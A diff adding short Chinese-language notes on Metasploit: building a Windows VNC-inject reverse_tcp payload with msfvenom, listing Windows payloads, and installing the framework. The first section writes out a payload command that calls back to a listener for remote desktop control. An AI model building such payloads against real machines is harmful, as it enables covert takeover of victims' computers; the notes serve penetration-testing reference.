@@ -1,0 +1,36 @@
+# 01 远程控制
+```
+选择windows/x64/vncinject/reverse_tcp，设置AUTOVNC为false，run之后，再开启vncviewer，配置如下
+
+msfvenom –p windows/x64/vncinject/reverse_tcp
+AUTOVNC=false
+LHOST=192.168.1.4
+LPORT=8080
+–f exe
+–o 192.168.1.4-8080.exe
+run
+
+目标主机执行payload后，监听器需成功接收反连，然后打开vncviewer，访问127.0.0.1:5900
+```
+# 02 检索包含windows的Payload
+```
+经测试发现，每行开头有4个空格
+
+msfvenom -l payloads | grep "^   windows"
+```
+# 03 各个平台下的安装
+发现自己经常需要在新环境下安装Metasploit，每次都要查阅官方文档效率有点低，故有此笔记
+```
+# Windows下安装
+下载安装器，地址：https://windows.metasploit.com/metasploitframework-latest.msi
+一路下一步即可
+
+# Linux（Ubuntu18.04）下安装
+一条命令自动安装
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+chmod 755 msfinstall && \
+./msfinstall
+
+# 参考链接
+https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+```
